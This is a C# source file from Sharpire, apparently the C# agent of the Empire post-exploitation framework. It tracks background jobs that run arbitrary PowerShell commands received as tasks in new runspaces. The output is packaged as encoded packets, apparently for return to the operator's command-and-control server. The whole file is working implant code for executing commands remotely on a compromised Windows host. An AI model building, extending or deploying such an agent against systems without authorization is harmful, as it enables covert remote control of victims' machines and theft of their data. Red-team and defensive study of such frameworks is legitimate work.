// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
// Updated and Modified by: Jake Krasnov (@_Hubbl3)
// Project: Empire (https://github.com/BC-SECURITY/Empire)

using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;

namespace Sharpire
{
    ////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////
    public class JobTracking
    {
        public Dictionary<string, Job> jobs;
        public Dictionary<string, ushort> jobsId;
        public byte[] ImportedScript { get; set; }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public JobTracking()
        {
            jobs = new Dictionary<string, Job>();
            jobsId = new Dictionary<string, ushort>();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void CheckAgentJobs(ref byte[] packets, ref Coms coms)
        {
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (KeyValuePair<string, Job> job in jobs)
                {
                    string results = "";
                    if (job.Value.IsCompleted())
                    {
                        try
                        {
                            results = job.Value.GetOutput();
                            job.Value.KillThread();
                        }
                        catch (NullReferenceException) { }

                        jobsToRemove.Add(job.Key);
                        packets = Misc.combine(packets, coms.EncodePacket(110, results, jobsId[job.Key]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] GetAgentJobsOutput(ref Coms coms)
        {
            byte[] jobResults = new byte[0];
            lock (jobs)
            {
                List<string> jobsToRemove = new List<string>();
                foreach (string jobName in jobs.Keys)
                {
#if (PRINT)
                    Console.WriteLine("Job: {0}", jobName);
#endif
                    string results = "";
                    if (jobs[jobName].IsCompleted())
                    {
                        try
                        {
                            results = jobs[jobName].GetOutput();
#if (PRINT)
                            Console.WriteLine(results);
#endif
                            jobs[jobName].KillThread();
                        }
                        catch (NullReferenceException) { }
                        jobsToRemove.Add(jobName);
                    }
                    else
                    {
                        results = jobs[jobName].GetOutput();
                    }

                    if (0 < results.Length)
                    {
                        jobResults = Misc.combine(jobResults, coms.EncodePacket(110, results, jobsId[jobName]));
                    }
                }
                jobsToRemove.ForEach(x => jobs.Remove(x));
                lock (jobsId)
                {
                    jobsToRemove.ForEach(x => jobsId.Remove(x));
                }
            }
            return jobResults;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal string StartAgentJob(string command, ushort taskId)
        {
            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            StringBuilder sb = new StringBuilder(8);
            for (int i = 0; i < 8; i++)
            {
                int j = random.Next(charactersArray.Length);
                sb.Append(charactersArray[j]);
            }

            string id = sb.ToString();
            lock (jobs)
            {
                jobs.Add(id, new Job(command));
            }
            lock (jobsId)
            {
                jobsId.Add(id, taskId);
            }
#if (PRINT)
            Console.WriteLine("Starting Job: {0}", id);
#endif
            return id;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        public class Job
        {
            private Thread JobThread { get; set; }
            private static string output = "";
            private static bool isFinished = false;

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public Job(string command)
            {
                JobThread = new Thread(() => RunPowerShell(command));
                JobThread.Start();
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public static void RunPowerShell(string command)
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (Pipeline pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(command);
                        pipeline.Commands.Add("Out-String");

                        StringBuilder sb = new StringBuilder();
                        try
                        {
                            Collection<PSObject> results = pipeline.Invoke();
                            foreach (PSObject obj in results)
                            {
                                sb.Append(obj.ToString());
                            }
                        }
                        catch (ParameterBindingException error)
                        {
                            sb.Append("[-] ParameterBindingException: " + error.Message);
                        }
                        catch (CmdletInvocationException error)
                        {
                            sb.Append("[-] CmdletInvocationException: " + error.Message);
                        }
                        catch (RuntimeException error)
                        {
                            sb.Append("[-] RuntimeException: " + error.Message);
                        }
                        finally
                        {
                            lock (output)
                            {
                                output = sb.ToString();
                            }
                            isFinished = true;
                        }
                    }
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public bool IsCompleted()
            {
                if (null != JobThread)
                {
                    if (true == isFinished)
                    {
                        return true;
#if (Print)
                    Console.WriteLine("Finished");
#endif
                    }
                    return false;
#if (Print)
                    Console.WriteLine("Running");
#endif
                }
                else
                {
#if (Print)
                    Console.WriteLine("Finished");
#endif
                    return true;
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public string GetOutput()
            {
                return output;
            }

            ////////////////////////////////////////////////////////////////////////////////
            ////////////////////////////////////////////////////////////////////////////////
            public void KillThread()
            {
                JobThread.Abort();
            }
        }
    }
}